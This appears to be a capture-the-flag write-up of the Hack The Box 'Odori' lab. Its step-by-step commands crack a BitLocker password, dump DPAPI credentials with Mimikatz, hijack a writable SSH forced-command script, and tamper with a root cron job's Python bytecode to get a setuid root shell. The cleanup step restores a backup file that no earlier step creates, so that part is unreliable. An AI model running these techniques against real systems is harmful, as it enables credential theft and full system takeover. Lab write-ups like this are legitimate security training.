# Odori — Hack The Box Write-up

**Platform:** Hack The Box  
**OS:** Linux  
**Difficulty:** Medium  
**Target:** `10.129.x.x`  
**Foothold:** Recover a backup service credential from a BitLocker-protected Windows disk  
**Privilege escalation:** Abuse a writable Python bytecode cache used by a root cron job

> This walkthrough is for the authorized Hack The Box Odori lab. Replace `10.129.x.x` with the current VPN target address before running the commands.

## 1. Enumeration

I started with a focused service scan:

```bash
nmap -Pn -n -p 22,139,445 -sC -sV 10.129.x.x
```

The target exposed SSH and Samba:

| Port | Service |
|---:|---|
| 22 | OpenSSH |
| 139 | Samba / NetBIOS |
| 445 | Samba / SMB |

The backup share allowed anonymous access. I listed its contents and downloaded the note:

```bash
smbclient -N -L //10.129.x.x
smbclient -N //10.129.x.x/backup
```

At the `smbclient` prompt:

```text
ls
get info.txt
```

The note pointed to the virtual disk image linked from the machine page. I downloaded the archive from HTB, extracted it, and used the resulting `file02.vmdk` for the next step.

## 2. Recovering the Windows backup credential

The virtual disk was protected with BitLocker. Since the image was available for offline analysis, I extracted its BitLocker material and tried the RockYou wordlist with John:

```bash
bitlocker2john -i file02.vmdk > bitlocker.hash
john --format=bitlocker bitlocker.hash /usr/share/wordlists/rockyou.txt
john --show --format=bitlocker bitlocker.hash
```

The disk password recovered from the image was:

```text
123456789
```

I attached the disk to a Windows analysis VM and unlocked the volume (the drive letter may differ):

```powershell
manage-bde -unlock E: -Password
```

After entering the recovered password, I inspected `E:\Scripts\backup.ps1`. It showed that the Windows host had a backup process and identified the service account `svc_backup`. The script also contained an older SFTP configuration, although its password was not present in clear text.

I then examined the offline Windows registry hives and the system profile's stored credentials. The hives of interest were `SAM`, `SYSTEM`, and `SECURITY`; the credential files were under:

```text
E:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
```

The credential directory contained DPAPI-protected data, including the small credential file:

```text
FB28D44A1080F4C10BF3530DD6D7B9E1
```

I copied the three hives from `E:\Windows\System32\config` to my analysis machine, along with the credential files, before parsing them. To reset the local Administrator password in the offline SAM hive, I used:

```bash
sudo apt install chntpw
chntpw -i SAM
```

In the interactive menu, I selected the `Administrator` account, cleared/reset its password, and wrote the modified hive. I put the modified SAM back on the disk image before booting it in the analysis VM.

For offline account and LSA-secret analysis, I extracted the registry hives and ran:

```bash
pypykatz registry --sam SAM --security SECURITY SYSTEM
```

This confirmed the local `svc_backup` account and exposed the system DPAPI material. With the modified disk booted in the analysis VM, I logged in as Administrator. From an elevated Mimikatz session, I obtained the DPAPI master key from memory and decrypted the stored credential:

```text
privilege::debug
token::elevate
sekurlsa::dpapi
dpapi::cred /masterkey:<recovered-master-key> /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\FB28D44A1080F4C10BF3530DD6D7B9E1 /unprotect
```

The decrypted credential belonged to `FILE02\svc_backup`:

```text
Username: svc_backup
Password: Napping2Curator
```

## 3. SFTP-only foothold

An ordinary SSH login authenticated but did not provide a usable shell. The same credentials worked with SFTP:

```bash
sftp svc_backup@10.129.x.x
```

I retrieved the SSH configuration and the forced-command helper to understand the restriction:

```text
sftp> get /etc/ssh/sshd_config
sftp> get /opt/restrict
```

The SSH configuration applied a `ForceCommand` for the `svc_backup` group, invoking `/opt/restrict`. The helper started `sftp-server`, and SFTP showed that the `svc_backup` account could write to that helper.

I replaced the helper contents with a small shell launcher:

```bash
#!/bin/bash
bash
```

From the SFTP prompt, I uploaded the replacement:

```text
sftp> put restrict /opt/restrict
```

I then opened a fresh SSH connection. With the forced command now starting Bash, I had a shell as `svc_backup`:

```bash
ssh svc_backup@10.129.x.x
id
```

The user flag was in the account's home directory:

```bash
cat /home/svc_backup/user.txt
```

## 4. Finding the root-run archiver

The filesystem contained two notable directories:

```text
/backup
/archive
```

`svc_backup` could write to `/backup`, while `/archive` was owned by root. I inspected the archiver under `/opt/archiver`:

```bash
ls -la /opt/archiver
cat /opt/archiver/app.py
cat /opt/archiver/helper.py
```

`app.py` scans `/backup` for files older than three years and calls `tar_and_move_files()` from `helper.py` for each eligible file. The helper invokes `/usr/bin/tar`. A root cron job runs the Python application periodically.

The source files were not writable, but the Python cache directory was:

```text
/opt/archiver/__pycache__
```

The compiled helper module was:

```text
/opt/archiver/__pycache__/helper.cpython-310.pyc
```

The cache directory's write permission let me replace the compiled module. Rather than changing bytecode structure, I changed the equal-length `/usr/bin/tar` string embedded in the `.pyc` to `/tmp/bin/tar`. When the cron job imported the cached helper, it would execute my replacement program.

## 5. Root

First, I saved a copy of the original cache file and confirmed the string before editing:

```bash
cp /opt/archiver/__pycache__/helper.cpython-310.pyc /tmp/helper-original.pyc
grep -aob '/usr/bin/tar' /opt/archiver/__pycache__/helper.cpython-310.pyc
```

I replaced only that string. The two paths are the same length, so the `.pyc` layout remains unchanged:

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|' \
  /opt/archiver/__pycache__/helper.cpython-310.pyc
```

Next, I created a replacement `tar` executable. When cron calls it as root, it marks Bash setuid:

```bash
mkdir -p /tmp/bin
cat > /tmp/bin/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /tmp/bin/tar
```

To make the archiver process a file, I created an old file in `/backup`:

```bash
touch /backup/ancient
touch -d '2015-08-09 13:38:36 UTC' /backup/ancient
```

After the scheduled job ran, I checked Bash's permissions and launched it while preserving its effective UID:

```bash
ls -l /bin/bash
/bin/bash -p
id
cat /root/root.txt
```

The shell had effective UID 0, which allowed reading the root flag.

## 6. Cleanup

After collecting the flags, I restored the original cache and forced-command helper, removed the temporary executable and trigger file, and cleared the setuid bit from Bash:

```bash
/bin/bash -p
chmod u-s /bin/bash
cp /tmp/helper-original.pyc /opt/archiver/__pycache__/helper.cpython-310.pyc
chown root:root /opt/archiver/__pycache__/helper.cpython-310.pyc
chmod 644 /opt/archiver/__pycache__/helper.cpython-310.pyc
cp /tmp/restrict-original /opt/restrict
chown svc_backup:root /opt/restrict
chmod 775 /opt/restrict
rm -rf /tmp/bin
rm -f /backup/ancient /tmp/helper-original.pyc /tmp/restrict-original
```

I ran these cleanup commands from the privileged Bash shell. I verified that `/bin/bash` no longer had the setuid bit and that the original helper and Python cache were back in place.

## 7. Takeaways

- Anonymous SMB access exposed a clue to the downloadable disk image.
- Recovering the BitLocker password enabled offline inspection of a Windows backup host.
- A DPAPI-protected credential revealed the password for the Linux backup account.
- The SSH forced command restricted the account to SFTP, but the forced-command script was writable by that account.
- A world-writable Python cache directory created a path to alter code loaded by a root-owned scheduled task.

---

<details>
<summary>Spoiler: flags</summary>

**User:** `e76ac2469f323e11a64c9f7d2xxxxxxx`  
**Root:** `96a79eb1dc9a6d70706ecb969xxxxxxx`

</details>
